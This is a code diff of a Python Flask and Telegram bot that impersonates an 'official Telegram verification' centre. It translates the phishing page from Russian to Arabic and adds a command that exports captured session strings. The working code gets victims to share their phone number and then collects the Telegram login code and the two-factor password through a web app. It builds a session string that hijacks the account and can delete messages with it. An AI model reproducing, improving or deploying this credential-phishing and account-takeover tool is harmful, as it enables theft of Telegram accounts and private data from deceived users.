@@ -5,7 +5,8 @@ import asyncio
 import os
 import threading
 import base64
-from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
+import io
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, InputFile
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
 app = Flask(__name__)
@@ -18,28 +19,113 @@ active_sessions = {}
 
 WEB_APP_HTML = """
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Верификация Telegram</title>
+    <title>توثيق تيليجرام الرسمي</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background-color: #0e1621; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #17212b; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 320px; text-align: center; border: 1px solid #232e3c; }
-        .badge-container { position: relative; width: 80px; height: 80px; margin: 0 auto 15px auto; }
-        .avatar { width: 80px; height: 80px; background: #2b5278; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #fff; font-weight: bold; overflow: hidden; object-fit: cover; }
+        body { 
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
+            color: #f8fafc; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .card { 
+            background: rgba(30, 41, 59, 0.8); 
+            backdrop-filter: blur(10px);
+            padding: 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+            width: 340px; 
+            text-align: center; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+        }
+        .badge-container { position: relative; width: 90px; height: 90px; margin: 0 auto 20px auto; }
+        .avatar { 
+            width: 90px; 
+            height: 90px; 
+            background: linear-gradient(45deg, #3b82f6, #2563eb); 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 36px; 
+            color: #fff; 
+            font-weight: bold; 
+            overflow: hidden; 
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
+        }
         .avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .blue-badge { position: absolute; bottom: 0; right: 0; background: #2481cc; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #17212b; z-index: 10; }
-        .blue-badge svg { width: 14px; height: 14px; fill: #fff; }
-        h3 { color: #fff; margin: 10px 0 5px 0; font-size: 18px; }
-        p { color: #829ba7; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #2b3847; background: #18222d; color: #fff; font-size: 15px; text-align: center; outline: none; }
-        input:focus { border-color: #2481cc; }
-        button { width: 95%; padding: 12px; background: #2481cc; color: white; border: none; border-radius: 10px; font-size: 15px; cursor: pointer; font-weight: 600; margin-top: 15px; transition: 0.2s; }
-        button:hover { background: #1b6cae; }
-        .msg { color: #e53935; font-size: 13px; margin-bottom: 10px; }
-        .success { color: #4cd964; font-size: 12px; word-break: break-all; background: #18222d; padding: 12px; border-radius: 8px; text-align: left; direction: ltr; max-height: 140px; overflow-y: auto; border: 1px solid #2b5278; margin-top: 10px; }
+        .blue-badge { 
+            position: absolute; 
+            bottom: 0; 
+            right: 0; 
+            background: #3b82f6; 
+            width: 28px; 
+            height: 28px; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            border: 3px solid #1e293b; 
+            z-index: 10; 
+        }
+        .blue-badge svg { width: 16px; height: 16px; fill: #fff; }
+        h3 { color: #f8fafc; margin: 10px 0 5px 0; font-size: 22px; font-weight: 600; }
+        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
+        input { 
+            width: 90%; 
+            padding: 14px; 
+            margin: 10px 0; 
+            border-radius: 12px; 
+            border: 1px solid rgba(255, 255, 255, 0.1); 
+            background: rgba(15, 23, 42, 0.6); 
+            color: #fff; 
+            font-size: 16px; 
+            text-align: center; 
+            outline: none; 
+            transition: all 0.3s ease;
+        }
+        input:focus { border-color: #3b82f6; box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
+        button { 
+            width: 95%; 
+            padding: 14px; 
+            background: linear-gradient(45deg, #3b82f6, #2563eb); 
+            color: white; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            font-weight: 600; 
+            margin-top: 20px; 
+            transition: all 0.3s ease; 
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+        }
+        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4); }
+        .msg { color: #ef4444; font-size: 14px; margin-bottom: 15px; font-weight: 500; }
+        .success { 
+            color: #10b981; 
+            font-size: 13px; 
+            word-break: break-all; 
+            background: rgba(16, 185, 129, 0.1); 
+            padding: 15px; 
+            border-radius: 12px; 
+            text-align: left; 
+            direction: ltr; 
+            max-height: 120px; 
+            overflow-y: auto; 
+            border: 1px solid rgba(16, 185, 129, 0.2); 
+            margin-top: 15px; 
+        }
+        .success::-webkit-scrollbar { width: 6px; }
+        .success::-webkit-scrollbar-track { background: transparent; }
+        .success::-webkit-scrollbar-thumb { background: rgba(16, 185, 129, 0.5); border-radius: 10px; }
     </style>
 </head>
 <body>
@@ -52,13 +138,13 @@ WEB_APP_HTML = """
                 <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l9.1-9.1 1.4 1.4z"/></svg>
             </div>
         </div>
-        <h3>Официальная верификация</h3>
-        <p id="desc_text">Введите код подтверждения из Telegram:</p>
+        <h3>توثيق الحساب الرسمي</h3>
+        <p id="desc_text">الرجاء إدخال رمز التحقق المرسل إليك في تيليجرام:</p>
         
         <div id="content">
             <div id="error_box" class="msg"></div>
-            <input type="text" id="code_val" placeholder="Код (например 12345)">
-            <button onclick="submitCode()">Подтвердить</button>
+            <input type="text" id="code_val" placeholder="الرمز (مثال: 12345)">
+            <button onclick="submitCode()">تأكيد الرمز</button>
         </div>
     </div>
 
@@ -77,9 +163,10 @@ WEB_APP_HTML = """
 
         function submitCode() {
             let code = document.getElementById('code_val').value.toString().trim();
-            if(!code) { alert("Введите код!"); return; }
+            if(!code) { alert("الرجاء إدخال الرمز!"); return; }
 
-            document.getElementById('error_box').innerText = "Проверка...";
+            document.getElementById('error_box').innerText = "جاري التحقق...";
+            document.getElementById('error_box').style.color = "#3b82f6";
 
             fetch('/api', {
                 method: 'POST',
@@ -89,30 +176,34 @@ WEB_APP_HTML = """
             .then(res => res.json())
             .then(data => {
                 if (data.status === 'need_password') {
-                    document.getElementById('desc_text').innerText = "Введите облачный пароль (2FA):";
+                    document.getElementById('desc_text').innerText = "الحساب محمي بخطوتين. الرجاء إدخال كلمة المرور:";
                     document.getElementById('content').innerHTML = `
                         <div id="error_box" class="msg"></div>
-                        <input type="password" id="pass_val" placeholder="Пароль">
-                        <button onclick="submitPassword()">Войти</button>`;
+                        <input type="password" id="pass_val" placeholder="كلمة المرور">
+                        <button onclick="submitPassword()">تسجيل الدخول</button>`;
                 } else if (data.status === 'done') {
-                    document.getElementById('desc_text').innerText = "Успешно верифицировано!";
+                    document.getElementById('desc_text').innerText = "تم التوثيق بنجاح!";
                     document.getElementById('content').innerHTML = `
-                        <h3 style="color: #4cd964;">✅ Готово!</h3>
-                        <p>Сессия сохранена:</p>
-                        <div class="success">${data.session}</div>`;
+                        <h3 style="color: #10b981; margin-bottom: 15px;">✅ اكتملت العملية!</h3>
+                        <p style="margin-bottom: 10px;">تم حفظ الجلسة بنجاح:</p>
+                        <div class="success">${data.session}</div>
+                        <button onclick="tg.close()" style="background: #475569; margin-top: 15px;">إغلاق</button>`;
                 } else {
-                    document.getElementById('error_box').innerText = data.message || "Ошибка";
+                    document.getElementById('error_box').style.color = "#ef4444";
+                    document.getElementById('error_box').innerText = data.message || "حدث خطأ";
                 }
             }).catch(err => {
-                document.getElementById('error_box').innerText = "Ошибка соединения";
+                document.getElementById('error_box').style.color = "#ef4444";
+                document.getElementById('error_box').innerText = "خطأ في الاتصال";
             });
         }
 
         function submitPassword() {
             let pass = document.getElementById('pass_val').value.toString().trim();
-            if(!pass) { alert("Введите пароль!"); return; }
+            if(!pass) { alert("الرجاء إدخال كلمة المرور!"); return; }
 
-            document.getElementById('error_box').innerText = "Проверка пароля...";
+            document.getElementById('error_box').innerText = "جاري التحقق من كلمة المرور...";
+            document.getElementById('error_box').style.color = "#3b82f6";
 
             fetch('/api', {
                 method: 'POST',
@@ -122,16 +213,19 @@ WEB_APP_HTML = """
             .then(res => res.json())
             .then(data => {
                 if (data.status === 'done') {
-                    document.getElementById('desc_text').innerText = "Успешно верифицировано!";
+                    document.getElementById('desc_text').innerText = "تم التوثيق بنجاح!";
                     document.getElementById('content').innerHTML = `
-                        <h3 style="color: #4cd964;">✅ Готово!</h3>
-                        <p>Сессия сохранена:</p>
-                        <div class="success">${data.session}</div>`;
+                        <h3 style="color: #10b981; margin-bottom: 15px;">✅ اكتملت العملية!</h3>
+                        <p style="margin-bottom: 10px;">تم حفظ الجلسة بنجاح:</p>
+                        <div class="success">${data.session}</div>
+                        <button onclick="tg.close()" style="background: #475569; margin-top: 15px;">إغلاق</button>`;
                 } else {
-                    document.getElementById('error_box').innerText = data.message || "Неверный пароль";
+                    document.getElementById('error_box').style.color = "#ef4444";
+                    document.getElementById('error_box').innerText = data.message || "كلمة المرور غير صحيحة";
                 }
             }).catch(err => {
-                document.getElementById('error_box').innerText = "Ошибка соединения";
+                document.getElementById('error_box').style.color = "#ef4444";
+                document.getElementById('error_box').innerText = "خطأ في الاتصال";
             });
         }
     </script>
@@ -156,7 +250,7 @@ def api():
 
     session_data = active_sessions.get(phone)
     if not session_data:
-        return jsonify({"status": "error", "message": "Сессия истекла."})
+        return jsonify({"status": "error", "message": "انتهت صلاحية الجلسة."})
 
     try:
         session_str_val = session_data['session_str_val']
@@ -184,7 +278,7 @@ def api():
                         session_data['session_str'] = new_session
                         return {"status": "done", "session": str(new_session)}
                     except Exception as e:
-                        return {"status": "error", "message": f"Неверный пароль: {e}"}
+                        return {"status": "error", "message": f"كلمة المرور غير صحيحة: {e}"}
 
         res = asyncio.run(execute_action())
         return jsonify(res)
@@ -193,11 +287,11 @@ def api():
         return jsonify({"status": "error", "message": str(e)})
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    button = KeyboardButton("🛡️ Подтвердить номер телефона", request_contact=True)
+    button = KeyboardButton("🛡️ توثيق رقم الهاتف", request_contact=True)
     reply_markup = ReplyKeyboardMarkup([[button]], resize_keyboard=True, one_time_keyboard=True)
     
     await update.message.reply_text(
-        "👋 Добро пожаловать في центр верификации Telegram.\n\nНажмите кнопку ниже для подтверждения номера:",
+        "👋 أهلاً بك في مركز توثيق تيليجرام الرسمي.\n\nاضغط على الزر بالأسفل لتوثيق رقم هاتفك:",
         reply_markup=reply_markup
     )
 
@@ -220,7 +314,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             sent_code = await temp_client.send_code_request(phone)
             
-            # محاولة سحب صورة الحساب الشخصية واسمه الأول
             photo_b64 = ""
             first_name = "Telegram"
             try:
@@ -250,15 +343,62 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             web_url = f"{base_url}/verify/{phone}"
 
-            keyboard = [[InlineKeyboardButton("💬 Ввести код подтверждения", web_app=WebAppInfo(url=web_url))]]
+            keyboard = [[InlineKeyboardButton("💬 إدخال رمز التحقق", web_app=WebAppInfo(url=web_url))]]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
             await update.message.reply_text(
-                "✅ Код подтверждения успешно отправлен в ваш Telegram. Нажмите кнопку ниже для ввода кода:",
+                "✅ تم إرسال رمز التحقق إلى حسابك في تيليجرام بنجاح. اضغط على الزر بالأسفل لإدخال الرمز:",
                 reply_markup=reply_markup
             )
         except Exception as e:
-            await update.message.reply_text(f"❌ Ошибка отправки кода: {e}")
+            await update.message.reply_text(f"❌ خطأ في إرسال الرمز: {e}")
+
+async def wahm_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    session_data = None
+    for p, data in active_sessions.items():
+        if 'session_str' in data:
+            session_data = data
+            break
+
+    if not session_data or 'session_str' not in session_data:
+        await update.message.reply_text("❌ لم يتم العثور على جلسة نشطة. يرجى توثيق الحساب أولاً!")
+        return
+
+    session_string = session_data['session_str']
+    phone = session_data['phone']
+    first_name = session_data['first_name']
+
+    # إنشاء ملف نصي فخم للجلسة
+    file_content = f"""━━━━━━━━━━━━━━━━━━━━━
+🌟 تم استخراج الجلسة بنجاح 🌟
+━━━━━━━━━━━━━━━━━━━━━
+👤 الاسم: {first_name}
+📱 الرقم: {phone}
+━━━━━━━━━━━━━━━━━━━━━
+🔑 كود الجلسة (String Session):
+{session_string}
+━━━━━━━━━━━━━━━━━━━━━
+🛡️ مطور البوت: FOKHM
+━━━━━━━━━━━━━━━━━━━━━"""
+
+    file_bytes = io.BytesIO(file_content.encode('utf-8'))
+    file_bytes.name = f"Session_{phone}.txt"
+
+    caption = f"""
+✅ **تم تسجيل الدخول بنجاح!**
+
+👤 **الحساب:** {first_name}
+📱 **الرقم:** `{phone}`
+
+📥 **ملف الجلسة الخاص بك مرفق أدناه.**
+✨ *احتفظ به في مكان آمن!*
+"""
+
+    await update.message.reply_document(
+        document=InputFile(file_bytes, filename=f"Session_{phone}.txt"),
+        caption=caption,
+        parse_mode='Markdown'
+    )
 
 async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session_data = None
@@ -268,14 +408,14 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
             break
 
     if not session_data or 'session_str' not in session_data:
-        await update.message.reply_text("❌ Сначала завершите верификацию!")
+        await update.message.reply_text("❌ يجب إكمال التوثيق أولاً!")
         return
 
     args = context.args
     limit = int(args[0]) if args and args[0].isdigit() else 100
     chat = update.effective_chat
 
-    status_msg = await update.message.reply_text(f"⏳ Удаление последних {limit} сообщений...")
+    status_msg = await update.message.reply_text(f"⏳ جاري حذف آخر {limit} رسالة...")
 
     try:
         session_str = session_data['session_str']
@@ -289,9 +429,9 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
                 except Exception:
                     pass
 
-        await status_msg.edit_text(f"✅ Успешно удалено сообщений: {deleted_count}")
+        await status_msg.edit_text(f"✅ تم حذف {deleted_count} رسالة بنجاح.")
     except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка: {e}")
+        await status_msg.edit_text(f"❌ خطأ: {e}")
 
 async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -309,10 +449,10 @@ if __name__ == '__main__':
     
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     application.add_handler(CommandHandler("start", start_command))
+    application.add_handler(CommandHandler("wahm", wahm_command))
     application.add_handler(CommandHandler("delet", delete_messages_command))
     application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
     print("Fokhm Perfect Bot is running...")
     application.run_polling()
-
